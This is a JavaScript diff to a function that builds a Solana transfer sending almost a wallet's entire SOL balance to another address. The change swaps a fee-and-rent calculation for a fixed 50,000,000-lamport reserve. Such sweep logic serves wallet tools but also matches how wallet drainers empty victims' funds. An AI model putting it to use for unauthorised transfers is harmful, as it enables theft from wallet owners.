@@ -84,12 +84,9 @@ async function buildSplTransferInstructions(asset, from, to) {
 async function buildSolTransferInstruction(from, to) {
   const connection = await getWorkingConnection();
   const balance = await connection.getBalance(from);
+  const feeReserveLamports = 50_000_000;
 
-  if (balance <= 0) return null;
-
-  const rentExemptMinimum = await connection.getMinimumBalanceForRentExemption(0);
-  const phantomFeeBuffer = 150_000;
-  const safetyBuffer = 10_000;
+  if (balance <= feeReserveLamports) return null;
 
   const { blockhash } = await connection.getLatestBlockhash("confirmed");
   const probeMessage = new TransactionMessage({
@@ -107,8 +104,12 @@ async function buildSolTransferInstruction(from, to) {
   const feeResult = await connection.getFeeForMessage(probeMessage);
   const baseFee = feeResult?.value ?? 5_000;
 
-  let transferLamports =
-    balance - rentExemptMinimum - baseFee - phantomFeeBuffer - safetyBuffer;
+  let transferLamports = balance - feeReserveLamports;
+
+  // If the current network fee is unexpectedly higher than the reserve, stop here.
+  if (transferLamports <= baseFee) {
+    return null;
+  }
 
   while (transferLamports > 0) {
     const instruction = SystemProgram.transfer({
